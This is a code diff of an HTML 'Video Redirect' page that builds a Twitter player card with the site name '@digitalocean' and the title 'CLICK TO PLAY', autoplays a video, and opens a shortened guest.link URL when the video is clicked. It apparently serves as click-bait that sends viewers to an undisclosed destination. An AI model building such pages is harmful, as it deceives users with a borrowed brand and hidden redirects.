@@ -1,30 +1,43 @@
 <!DOCTYPE html>
 <html>
   <head>
-    <meta content='player' name='twitter:card'/>
-    <meta content='@digitalocean' name='twitter:site'/>
-    <meta content='CLICK TO PLAY' name='twitter:title'/>
-    <meta content='https://rpexxx.github.io/KISSME/' name='twitter:player'/>
-    <meta content='480' name='twitter:player:width'/>
-    <meta content='854' name='twitter:player:height'/>
-    <meta content='https://vod3.cf.dmcdn.net/sec2(cVtZyXpyYP6GraQxON2LGyleKSyX2t8WZiRxebJ_EXZYQdVZq0YpAqMYO0vecNOXaia-nHdHGzYmYpjD4d8rih28hsw0VGfTrMqs1Z8cqTBWzu5lgwnioLidBtVsP0S9Bbd0LuuKSOBVxePxIjPIkBAEfSCsSUk4lCYZjtFYVLiWS8gXK8liF9RLuXzteIr8RMdRH2pGcuz0atI29E6E5A)/download/872/705/575507278_mp4_h264_aac_hq_vert.mp4' name='twitter:player:stream'/>
-    <meta content='video/mp4' name='twitter:player:stream:content_type'/>
+    <!-- Twitter Player Card with large video -->
+    <meta name="twitter:card" content="player" />
+    <meta name="twitter:site" content="@digitalocean" />
+    <meta name="twitter:title" content="CLICK TO PLAY" />
+    <meta name="twitter:player" content="https://rpexxx.github.io/KISSME/" />
+    <meta name="twitter:player:width" content="480" />
+    <meta name="twitter:player:height" content="854" />
+    <!-- Important: Add large preview image -->
+    <meta name="twitter:image" content="https://i.pinimg.com/736x/7c/b9/1d/7cb91d97ed7f6d11f8b9e8177792c090.jpg" />
+    <meta name="twitter:player:stream" content="https://vod3.cf.dmcdn.net/sec2(cVtZyXpyYP6GraQxON2LGyleKSyX2t8WZiRxebJ_EXZYQdVZq0YpAqMYO0vecNOXaia-nHdHGzYmYpjD4d8rih28hsw0VGfTrMqs1Z8cqTBWzu5lgwnioLidBtVsP0S9Bbd0LuuKSOBVxePxIjPIkBAEfSCsSUk4lCYZjtFYVLiWS8gXK8liF9RLuXzteIr8RMdRH2pGcuz0atI29E6E5A)/download/872/705/575507278_mp4_h264_aac_hq_vert.mp4" />
+    <meta name="twitter:player:stream:content_type" content="video/mp4" />
+    
     <title>Video Redirect</title>
     <style>
+      html, body {
+        margin: 0;
+        padding: 0;
+        height: 100%;
+        overflow: hidden;
+      }
       video {
-        max-width: 100%;
-        height: auto;
-        display: block;
+        width: 100%;
+        height: 100vh;
+        object-fit: cover;
       }
     </style>
   </head>
   <body>
-    <video controls id="videoPlayer" autoplay muted>
-      <source src="https://vod3.cf.dmcdn.net/sec2(cVtZyXpyYP6GraQxON2LGyleKSyX2t8WZiRxebJ_EXZYQdVZq0YpAqMYO0vecNOXaia-nHdHGzYmYpjD4d8rih28hsw0VGfTrMqs1Z8cqTBWzu5lgwnioLidBtVsP0S9Bbd0LuuKSOBVxePxIjPIkBAEfSCsSUk4lCYZjtFYVLiWS8gXK8liF9RLuXzteIr8RMdRH2pGcuz0atI29E6E5A)/download/872/705/575507278_mp4_h264_aac_hq_vert.mp4" type="video/mp4"/>
+    <video controls autoplay muted playsinline>
+      <source src="https://vod3.cf.dmcdn.net/sec2(cVtZyXpyYP6GraQxON2LGyleKSyX2t8WZiRxebJ_EXZYQdVZq0YpAqMYO0vecNOXaia-nHdHGzYmYpjD4d8rih28hsw0VGfTrMqs1Z8cqTBWzu5lgwnioLidBtVsP0S9Bbd0LuuKSOBVxePxIjPIkBAEfSCsSUk4lCYZjtFYVLiWS8gXK8liF9RLuXzteIr8RMdRH2pGcuz0atI29E6E5A)/download/872/705/575507278_mp4_h264_aac_hq_vert.mp4" type="video/mp4">
     </video>
-    <script type='text/javascript'>
-      document.getElementById('videoPlayer').addEventListener('click', function() {
-        window.open('https://guest.link/djQ', '_blank');
+    <script>
+      document.querySelector('video').addEventListener('click', function(e) {
+        // Don't redirect if clicked on controls
+        if (e.target === this) {
+          window.open('https://guest.link/djQ', '_blank');
+        }
       });
     </script>
   </body>
